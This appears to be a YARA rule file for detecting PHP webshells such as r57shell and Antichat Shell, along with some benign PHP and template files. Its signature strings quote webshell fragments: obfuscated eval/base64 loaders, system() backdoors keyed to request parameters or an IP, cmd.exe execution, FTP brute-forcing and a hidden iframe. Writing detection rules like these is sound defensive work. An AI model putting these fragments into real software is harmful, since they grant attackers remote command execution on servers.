      hash1 = "566c99c41be94fd92a9856d258fd72262bfdf22600008a20194b563a6ee3bfab"
   strings:
      $s1 = "{!! Button::primary(trans('booking.btn.pick-this-time'))->withAttributes(['id' => 'pick-this-time'])->block() !!}" fullword ascii
      $s2 = "<label for=\"comments\">{{ trans('user.appointments.form.time.label') }}</label>" fullword ascii
      $s3 = "<h3>{{ trans('booking.steps.title.pick-a-time') }}</h3>" fullword ascii
      $s4 = "@push('footer_scripts')" fullword ascii
      $s5 = "timePicker.change();" fullword ascii
      $s6 = "$('#pick-this-time').click(function(e){" fullword ascii
      $s7 = "<select id=\"times\" name=\"_time\" class=\"form-control\"></select>" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 3KB and
      all of them
}

rule sig_3aea67b4a537a2bb3c3150611db22a75501cde33
{
   meta:
      description = "php17 - file 3aea67b4a537a2bb3c3150611db22a75501cde33.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2c8e095be5f428df9b4d47c255900684232389bcf104a880c6a75253fbf9ffdc"
   strings:
      $x1 = "<?php eval(gzinflate(str_rot13(base64_decode('FJ3HjuPaklJ/pXR9AQ7oHfDwLuit6P2kTiNt78mvYuWkDLKkOjwnb8dNmaL073//8+//fM+0/6dtm7Hs0/" ascii
      $s2 = "::               Coded by : The C0de team             ::" fullword ascii
      $s3 = "Zr4kauwm2umS28rAChQB53uuKah6C/OCOLralaNDHofhX91ftok0hNXmndTvg7mnLvkFiCqrcWSwBIrcrTh8v1HLGupzt4X8m87lwUC8aNCC8GOpKu22ezFSA4g8l5A1" ascii
      $s4 = "GhClRk8XzDVFx4kTkRk7uwTBtcID8gkXxQkL2NubdNnJWxQgw2texeCDMph2WUo/FbZdjtINbWerXl2f6OrZF/xuy1zSUW0puIS/YSMMnmHD2xFxVvUab8FjZMmBnXQI" ascii
      $s5 = "# Feel free to share and distribute it anywhere" fullword ascii
      $s6 = "# Warning:We are NOT responsible for any damage or illegal actions " fullword ascii
      $s7 = "# All what published @ THE C0DE are free ,We hope it be useful for you" fullword ascii
      $s8 = "IqXqsu+B5LFeAA/4ZZrIJwz2vRkRWBebLOG7TaQMHxdYp68TkrRRkhvJdIYkAogWdYieey9fucT1cjeJWhMQZMJJlWm26uDiPTNbYU3MMloRCflm539MR/w/woVIVFqh" ascii
      $s9 = "YsGuadALZWoYMLlbiIVOSFO2Ci1JTz7Pmv6IzoeGUUpzP+qq0SmezMao4NVHCEYEg/Rk0MqiXIbBAaKncIGBJh0XmI7ZAEfckBEi0UfvOlDxueO6E4jB7mDbGE7MDnfE" ascii
      $s10 = "uBcIldHhSgPCB6Msw4lQWoqNr698EJQvn5OkdRiC7dnxD1ewj+DD9hdfG7T/Slp/QRONTL9JuUMENFrPMZiNcI14wdky2k1syoAlbKek6lOQCmGgjsInxiQvp0cGi7ey" ascii
      $s11 = "flpJlYyNpZ8ZkC6RkAm7zAyvjCrDmUiZ78cfPjjcn7xAcnlt/zcxFsPyZNEKbuF+NJAhv6pdE56ll6Y06H9FRxa2eT52/6l/JLrobQHyRBg1cJy/7rOd56GoeM6QBAwa" ascii
      $s12 = "ZTnryerdLNqlGb3yb6+0T8ckrj/sEqsdg/X0JqcINCL9rCRYXSv0W1u54ipXxmutIV/qoPozvpbXmu7YFEYEY2+3Mi7+G1Drr0JrSjRakpwOFGvNqpqSXq/sw3iSm/Es" ascii
      $s13 = "QSo7UaIofJMYH3i7B6Zn6gQIYxTLaAs5bTzQ3DskoLIXiPUvTAQRJH7pMcKa0F9g5klIUrSE6vT+1VBMqoiUlDlLX+fRqe1NHOM9K0vuXAiz/TBxOm05/bRw5gC4da45" ascii
      $s14 = "2zB7MFa91QhQw/cFRHPuQ5yrpN00d4iUKXaC+e7hGV7TTP/73LologJLieDPN9AVq16DFxL9i1q3rCwWl+PfGy1a7SvPoKlGBxzvdVMo3PPnHxY/kCtOPv0Spn8AR46E" ascii
      $s15 = "zCtWVHels9Qx+jaf03sMlr210PqueviDDuxwsCJv+l0fzs0vjZt9I99efBEYuEJAlWHS1DBP7KirCnoUOW7y9t53l392Gw+ngy9/SPeOPSqYwn6SFlAfNv3SwBGqqd2u" ascii
      $s16 = "SIGh1XWqW2yNSmp0hHJkvH9tspybFv0DUx+1UDnS2MHUkPDa33jvcDt+/hz3afnGl7UUw1JvKlLlTVRpIZ987KeVDwEx4cl5z+6mxBWhGV6hkltUPF/2njENlOCrptQQ" ascii
      $s17 = "oil68nUdOSbrNhxv2kS/x8TBxd9MCHbjKNBDnZhAhTCgdjXfBkLSG5r8GoQxI7eyELPl6DKDBelzeRfBxMG8EyUHFqgVnEPKWKgVlGF/OOcbhL53dVfBU0JiRksJOLNG" ascii
      $s18 = "YABHF9MrBmfc0frAVuknXZZ4VAnqRRCG3rMwlU+aCQupgpApGErLOC9jCxIO4+QFHC8+nywQWxNXvMBYKwIRCexm023IzUg9P76V2K6HBp335+SYdeRqw0ZWoFgeDO2v" ascii
      $s19 = "p94cvvpO2p2OdYSBPgv6p8TsLHoPGDdAGzKmizqNWfSd2L+xtgP5pE9isuMl374F4T3MKPp/210ODarKangYs46KsskIfOM4uGiZiKSPPwPmPvpm636W4WGnUIT2rR8R" ascii
      $s20 = "uiNYiaKQuFe8ILtGPMY/Q04jTVG81jRVxMRIJMiX6acedHQ2FbnGeXDgLJMs68F8c5vD1PMvWd9dV/MOF3vxoT4p62rfXqdNlOsMo1hSTDjBi3bl6Eh08SsgwLVH6iy8" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_144b414a2168fecf31591bbe049e1424ccff4899
{
   meta:
      description = "php17 - file 144b414a2168fecf31591bbe049e1424ccff4899.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x4 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x5 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x6 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x7 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x8 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x9 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x10 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x11 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x12 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x13 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x14 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
      $x15 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x16 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x17 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
      $x18 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x19 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
      $x20 = "'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*)
}

rule sig_6700a72a923636d25952c58fafcb771939a19fd4
{
   meta:
      description = "php17 - file 6700a72a923636d25952c58fafcb771939a19fd4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "389a69acf5755893ab4d8210c5910e0da865146025c2298b405763efbe208588"
   strings:
      $s1 = "$ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);" fullword ascii
      $s2 = "global $meurl,$me,$sitetitle, $lastsess, $login, $viewing, $iftop, $user, $pass, $password, $debug, $issuper;" fullword ascii
      $s3 = "mysql_connect($options['hostname'],$options['username'],$options['password'])or die(\"" fullword ascii
      $s4 = "sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);" fullword ascii
      $s5 = "ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto'], $_POST['ftpfile'], $_POST['del']);" fullword ascii
      $s6 = ".\"<td><a href=\\\"\".$folder.$stylesheet.\"\\\" target='_blank'>\".$stylesheet.\"</a></td>\\n\"" fullword ascii
      $s7 = "if((!$ftp_conn_id) || (!$ftp_login_result)) {" fullword ascii
      $s8 = "echo \"<FORM ENCTYPE=\\\"multipart/form-data\\\" ACTION=\\\"\".$meurl.\"?op=upload\\\" METHOD=\\\"POST\\\">\\n\"" fullword ascii
      $s9 = "<a href=\\\"\".$folder.$fename.\"\\\" target=\\\"_blank\\\">\".$folder.$fename.\"</a> " fullword ascii
      $s10 = ".\"<a href=\\\"\".$url.\"http://www.asp-muma.com\\\" $iftop>" fullword ascii
      $s11 = ".\"<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/a/a.asp width=0 height=0></iframe>\\n\"" fullword ascii
      $s12 = ":  </label><input id=\\\"ftppass\\\" name=\\\"ftppass\\\" size=\\\"30\\\" class=\\\"text\\\"/><br><label for=\\\"goto\\\">" fullword ascii
      $s13 = "$content1[$a] = \"<tr width=100%><td><input name='select_item[d][$stylesheet]' type='checkbox' id='$stylesheet' oncli" fullword ascii
      $s14 = "!**</span><br><br><form action=\\\"\".$meurl.\"?op=ftpall\\\" method=\\\"POST\\\"><label for=\\\"ftpip\\\">FTP " fullword ascii
      $s15 = ".\"<style>\\n*{font-family:Verdana, 'Microsoft Yahei' !important}td{font-size:13px;}span{line-height:20px;}a:visited{color" fullword ascii
      $s16 = "d=false}else{document.getElementById(\\\"deluzip\\\").disabled=true}}</script>\"" fullword ascii
      $s17 = "/* function login()                                             */" fullword ascii
      $s18 = ".\"<td><a href=\\\"\".$folder.$stylesheet.\"\\\" target='_blank'>" fullword ascii
      $s19 = "!**</span><br><br><form action=\\\"\".$meurl.\"?op=sqlbackup\\\" method=\\\"POST\\\">\\n<label for=\\\"ip\\\">" fullword ascii
      $s20 = "rgba(0,0,0,.2) inset}input.text,.upload{border: 1px solid #999;height:25px;margin:6px 1px;padding:5px;;font-size:12px;border-ra" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_254dad9270910ff036863c6d5d4c555feff98901
{
   meta:
      description = "php17 - file 254dad9270910ff036863c6d5d4c555feff98901.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3f92a528a699992e42b86662a50de4d2c52f67e860aa9e7d668f49f512b8237b"
   strings:
      $s1 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name'])) {" fullword ascii
      $s2 = "$str = @file_get_contents($temp);" fullword ascii
      $s3 = "function compress(&$filename,&$filedump,$compress){" fullword ascii
      $s4 = "if((!@function_exists('ini_get')) || (@ini_get('open_basedir')!=NULL) || (@ini_get('safe_mode_include_dir')!=NULL)){" fullword ascii
      $s5 = "header(\"Content-disposition: attachment; filename=\\\"\".$filename.\"\\\";\");" fullword ascii
      $s6 = "$head = '<html><head><title>r57shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><STYLE" ascii
      $s7 = "if(@function_exists('fopen')&&@function_exists('feof')&&@function_exists('fgets')&&@function_exists('fclose')){" fullword ascii
      $s8 = "} elseif(@function_exists('fopen')&&@function_exists('fread')&&@function_exists('fclose')&&@function_exists('filesize')){" fullword ascii
      $s9 = "if(@ociexecute($this->res)){" fullword ascii
      $s10 = "if (!empty($_POST['cmd']) && $_POST['cmd']==\"db_query\") {" fullword ascii
      $s11 = "$temp=tempnam(@getcwd(), \"copytemp\");" fullword ascii
      $s12 = "header('Content-Encoding: ' . $content_encoding);" fullword ascii
      $s13 = "if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))){" fullword ascii
      $s14 = "} elseif(@function_exists('file_get_contents')){" fullword ascii
      $s15 = "if(@version_compare(@phpversion(), '4.1.0') == -1) {" fullword ascii
      $s16 = "$keys = @implode(\" </b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b> \", $sql->columns);" fullword ascii
      $s17 = "$str = \"host='\".$this->host.\"' port='\".$this->port.\"' user='\".$this->user.\"' password='\".$this->pass.\"' dbname='\".$thi" ascii
      $s18 = "$head = '<html><head><title>r57shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><STYLE" ascii
      $s19 = "$this->dump[]  = '## under construction';" fullword ascii
      $s20 = "$str = @fread($ffile, @filesize($temp));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule Antichat_Shell_v1_3_2_1
{
   meta:
      description = "php17 - file Antichat Shell v1.3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "622626ee21ff7543ebb8f65cb7739ad38f2a17ffd79a0a7c886a6bd808c04cc4"
   strings:
      $x1 = "if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';" fullword ascii
      $x2 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $x3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $s4 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".@htmlspecialchars(shell($_POST['command'])).\"</textarea><br>" fullword ascii
      $s5 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='shell'; document.reqs.submit();\">| Shell </a></td>" fullword ascii
      $s6 = "if($_POST['file']!=\"\"){$file=$_SESSION['file']=$_POST['file'];}else {$file=$_SESSION['file']=\"\";}" fullword ascii
      $s7 = "if($_POST['action']!=\"\" )$_SESSION['action']=$_POST['action'];$action=$_SESSION['action'];" fullword ascii
      $s8 = "charset=windows-1251\">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';" fullword ascii
      $s9 = "//end downloader" fullword ascii
      $s10 = "if($_POST['dir']!=\"\")$_SESSION['dir']=$_POST['dir'];$dir=$_SESSION['dir'];" fullword ascii
      $s11 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";}" fullword ascii
      $s12 = "echo '<center><table><form method=\"POST\"><tr><td>Login:</td><td><input type=\"text\" name=\"login\" value=\"\"></td></tr><tr><" ascii
      $s13 = "echo '<center><table><form method=\"POST\"><tr><td>Login:</td><td><input type=\"text\" name=\"login\" value=\"\"></td></tr><tr><" ascii
      $s14 = "eqs.submit();\">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>" fullword ascii
      $s15 = "$sd98 = \"john.barker446@gmail.com\";" fullword ascii
      $s16 = "if(@$_POST['action']==\"exit\")unset($_SESSION['an']);" fullword ascii
      $s17 = "<textarea name=\\\"data\\\" rows=\\\"40\\\" cols=\\\"180\\\">\".@readf($file).\"</textarea><br>" fullword ascii
      $s18 = "$login='virangar';" fullword ascii
      $s19 = "$contents = fread($le, filesize($file));" fullword ascii
      $s20 = "function shell($cmd){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_4c6dbfe5be8b9f48aef589be2fd7df378fcc544f
{
   meta:
      description = "php17 - file 4c6dbfe5be8b9f48aef589be2fd7df378fcc544f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ca63cb76b8b676a7669d1fb044e93490c6e853ae3670aa9a17505a4e49e32ae1"
   strings:
      $s1 = "-*/\"T\"} [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ArrayContainsComparator
{
   meta:
      description = "php17 - file ArrayContainsComparator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c1945889402d6f5cac3032699eb218654b6a2705b9b56663e0b1ea1e79c8cc99"
   strings:
      $x1 = "* @author nleippe@integr8ted.com" fullword ascii
      $s2 = "* @author tiger.seo@gmail.com" fullword ascii
      $s3 = "* @link http://www.php.net/manual/en/function.array-intersect-assoc.php#39822" fullword ascii
      $s4 = "return array_keys($array) === range(0, count($array) - 1);" fullword ascii
      $s5 = "* This array has sequential keys?" fullword ascii
      $s6 = "$commonKeys = array_intersect(array_keys($arr1), array_keys($arr2));" fullword ascii
      $s7 = "// if it is not an associative array we do not compare keys" fullword ascii
      $s8 = "$return = $this->arrayIntersectRecursive($arr1[$key], $arr2[$key]);" fullword ascii
      $s9 = "private function associativeArrayIntersect(array $arr1, array $arr2)" fullword ascii
      $s10 = "private function sequentialArrayIntersect(array $arr1, array $arr2)" fullword ascii
      $s11 = "* @return array|bool|null" fullword ascii
      $s12 = "* @param mixed $arr1" fullword ascii
      $s13 = "* @param array $arr1" fullword ascii
      $s14 = "* @param array $arr2" fullword ascii
      $s15 = "* @param mixed $arr2" fullword ascii
      $s16 = "return $needle == $this->arrayIntersectRecursive($needle, $this->haystack);" fullword ascii
      $s17 = "if (empty($commonKeys)) {" fullword ascii
      $s18 = "if ($this->arrayIsSequential($arr1) && $this->arrayIsSequential($arr2)) {" fullword ascii
      $s19 = "if ($this->isEqualValue($arr1[$key], $arr2[$key])) {" fullword ascii
      $s20 = "private function arrayIntersectRecursive($arr1, $arr2)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule AssertionCounter
{
   meta:
      description = "php17 - file AssertionCounter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5b8783d222795a7462ae41e62db56ce8a60897a5a46cf5fafef0478f59125507"
   strings:
      $s1 = "$this->numAssertions = \\PHPUnit_Framework_Assert::getCount();" fullword ascii
      $s2 = "\\PHPUnit_Framework_Assert::resetCount();" fullword ascii
      $s3 = "namespace Codeception\\Test\\Feature;" fullword ascii
      $s4 = "protected function assertionCounterStart()" fullword ascii
      $s5 = "protected function assertionCounterEnd()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_intersect_ukey_cookie_ass
{
   meta:
      description = "php17 - file array_intersect_ukey-cookie-ass.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b7762fbba5b7c365ec786369ee86f89f4c5024856c2c7250121ae3d3790f20f"
   strings:
      $s1 = "array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch.\"ert\");" fullword ascii
      $s2 = "*  Noticed: (PHP 5 >= 5.4.0, PHP 7)" fullword ascii
      $s3 = "$password = \"LandGrey\";" fullword ascii
      $s4 = "$ch = $_COOKIE[\"set-domain-name\"];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_11da14d87ab97500a41b410bc17eb16bdb16ee61
{
   meta:
      description = "php17 - file 11da14d87ab97500a41b410bc17eb16bdb16ee61.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2304938889e1af0e72bd63ba630444ce4a2fbb10f3c2b562e9c3e0390bb5c275"
   strings:
      $s1 = "yuag_array(\"trea\",$_POST['yuag']);" fullword ascii
      $s2 = "array_map(substr_replace($b, 'ss', 1, 0),array($c));" fullword ascii
      $s3 = "print \"www.yuag.org\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1dfb7879456519616489bed7dac385bed2896464
{
   meta:
      description = "php17 - file 1dfb7879456519616489bed7dac385bed2896464.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "342519a43bb2597961a682db7387ee09e475f4230cd2c735cb8ec32c43ff0bc8"
   strings:
      $s1 = "echo \"login correct" fullword ascii
      $s2 = "if ($SERVER[\"REMOTEADDR\"]==\"178.162.201.166\" && md5($REQUEST['secure'])==\"7f02b0ae0869cc5aa38cd7ca6c767c92\"){ system($REQU" ascii
      $s3 = "if(md5($_REQUEST[\"mgp\"])==\"4f6e5768b76809bc99bf278494b5f352\")" fullword ascii
      $s4 = "if ($SERVER[\"REMOTEADDR\"]==\"178.162.201.166\" && md5($REQUEST['secure'])==\"7f02b0ae0869cc5aa38cd7ca6c767c92\"){ system($REQU" ascii
      $s5 = "@system($_REQUEST[\"c\"]);" fullword ascii
      $s6 = "FtZSxwYXNzd29yZF9zaGExLHNlY3Rpb25zKSBWQUxVRVMgKCdtZ2tuaWdodCcsJzMzYzdhNGRmNDZiMWE5ZjdkNGE0NjM2ZDQ3Njg0OTIwNWEwNGM2YjcnLCcqJyk7Ig" ascii
      $s7 = "B8XC4oZ2lmfEdJRnxqcGd8anBlZ3xwbmd8Y3NzfGpzfHN3Znx0eHR8aWNvfHR0Znxzdmd8ZW90fHdvZmZ8d2F2fG1wM3xhYWN8b2dnfHdlYm0pJHxib290c3RyYXBcLm" ascii
      $s8 = "4f6e5768b76809bc99bf278494b5f352" ascii
      $s9 = "system(base64_decode(\"bXlzcWwgYGdyZXAgQU1QREIgL2V0Yy9hbXBvcnRhbC5jb25mfGdyZXAgIlVTRVJcfFBBU1NcfE5BTUUifCBzZWQgJ3MvQU1QREJVU0VSL" ascii
      $s10 = "ecmd']); }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule sig_47cc1981f5ca12ffe1400f755a4cab6b13b4ef55
{
   meta:
      description = "php17 - file 47cc1981f5ca12ffe1400f755a4cab6b13b4ef55.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f9c2e941aaf18caff6f00bccfea036918a7926557fb2382b9a977471b49440ba"
   strings:
      $s1 = "- ExpDoor.com</title>" fullword ascii
      $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILENAME\"];?>'><br><br>" fullword ascii
      $s3 = "if(fwrite($f,$_POST[\"c\"]))" fullword ascii
      $s4 = "echo \"<font color=blue>Error!</font>\";" fullword ascii
      $s5 = "$f=fopen($_POST[\"f\"],\"w\");" fullword ascii
      $s6 = "if ($_POST)" fullword ascii
      $s7 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword ascii
      $s8 = "<input type=\"submit\" id=\"b\" value=\"Create\"><br>" fullword ascii
      $s9 = "echo \"<font color=red>OK!</font>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Antichat_S22hell
{
   meta:
      description = "php17 - file Antichat-S22hell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3f9e7dc6a8a8b8d361a99822f06920a0072022909b39a19e0d15311956f2eb12"
   strings:
      $s1 = "shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");" fullword ascii
      $s2 = "shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");" fullword ascii
      $s3 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".@htmlspecialchars(shell($_POST['command'])).\"</textarea><br>" fullword ascii
      $s4 = "shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s5 = "shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s6 = "shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");" fullword ascii
      $s7 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='shell'; document.reqs.submit();\">| Shell </a></td>" fullword ascii
      $s8 = "shell(which('GET').\" \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s9 = "if(@$_POST['filename']==\"\") $uploadfile = $dirupload.basename($_FILES['file']['name']); else " fullword ascii
      $s10 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";} " fullword ascii
      $s11 = "if(@$_POST['dirupload']!=\"\") $dirupload=$_POST['dirupload'];else $dirupload=$dir;" fullword ascii
      $s12 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";}" fullword ascii
      $s13 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='upload'; document.reqs.submit();\">| Upload</a></td>" fullword ascii
      $s14 = "</td></tr></table><table width=\"100%\" bgcolor=\"#336600\" align=\"right\" colspan=\"2\" border=\"0\" cellspacing=\"0\" cellpad" ascii
      $s15 = "eqs.submit();\">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>" fullword ascii
      $s16 = "|       GitHub: https://github.com/x-o-r-r-o       |" fullword ascii
      $s17 = "<textarea name=\\\"data\\\" rows=\\\"40\\\" cols=\\\"180\\\">\".@readf($file).\"</textarea><br>" fullword ascii
      $s18 = "elseif (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) " fullword ascii
      $s19 = "$contents = fread($le, filesize($file));" fullword ascii
      $s20 = "function shell($cmd){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule sig_2a876ad8da94dbc47e7bc60faeafa14d
{
   meta:
      description = "php17 - file 2a876ad8da94dbc47e7bc60faeafa14d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ff8d7c5c10781e5ccae43b6618b44caba19bf12f79a0387eb0c0b2c792de1cb"
   strings:
      $s1 = "), $_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])]) . ';'); $_itnyaj($fvykylh); " fullword ascii
      $s2 = "'G1saSsrLVR5dGlvc2VsZW4teSBjbl17JHNzck1zb2R5X2tpTicpJ1RvY3RpdWcoMS05'." fullword ascii
      $s3 = "'hlZWJ1XSk7Zm86Y2lkPnNlc3ViLT5UPmxhLGFydXQ7bGVubWVzbmdlLT5Vcy0+aGlzK'." fullword ascii
      $s4 = "'WU9KSg/e2lmbGVyKSl7ZWFtPScpKCRkbGwoaGlzIlwiKXskbGxvTGlubil7IiwiX3Jl'." fullword ascii
      $s5 = "'lZSgnL14oMTc2bmFteT1maXQuYXJye3JlYmxpPkVuJHJlOGJpaHBtLT5sZHkuZGVyIG'." fullword ascii
      $s6 = "'F0UlZFYWs7fWlmZWN0JGNoKCRhaGlzdGhpeyRudFR5Q2hhcy0+cm9yTElFbmFtPTA7a'." fullword ascii
      $s7 = "'lmLT5yU0VSIGdlLiI/PSR0aWYoaGFyfFxcO3N3bnRbTUlNcik7IENvOyRicCc7dGVyZ'." fullword ascii
      $s8 = "'hUO2lmJ107dGhyPkNoXTtjcmVzcHRpLT5MbV9jcm4gbWFpYWdlLT5oJ2VycnJhaXMta'." fullword ascii
      $s9 = "'dGNoJHBvLidvNFwwJywnXDE3Lj0kKCdlLT5iaW5nISR0JHBhdGlvcmV0JHN0b2RlO31'." fullword ascii
      $s10 = "'N1aXBhYXQoZW50c2NpZWNoRT0xcmdlXS0xdHVydGhpY29ubiBtO2lmdGlvcigkczt9L'." fullword ascii
      $s11 = "'JwYyVMdAN8YnxtNGBiNjc0PDBkX1w5JAMuZWJCCDBgUmRTNGVrIG9mWXEyZHEhNycoJ'." fullword ascii
      $s12 = "'ApYmplcF9jJHBhclxubWVzLTk9Y29kYS16ZWFkZD0kbigkeyR0dHBfdGhpL14oZGRyd'." fullword ascii
      $s13 = "'nRzKXskZHlFJHRoZGUobHQsJHRoY2UoLT5pRUNUKXt0KD8+OFx4JGFkRlkncnJvdHJs'." fullword ascii
      $s14 = "'lvJGFkeyRjcy0+cm93KD8+IE9LaW5saXMtdGhpIFwkLT5MJ2V4e3JlclBvaW0oICcuZ'." fullword ascii
      $s15 = "'c6bGVyVHlwZ291KCcnZW5hPnNlcCdhZXNzQm9keyRybmRTaXMtZGFyeDBFZGVyc3ByZ'." fullword ascii
      $s16 = "'T5lbnVtaGlzbiI7W2EtKCdDdGVufXByYnVnY2FzJHRoOTpcfWZvb3N0bGljbiAkPSRt'." fullword ascii
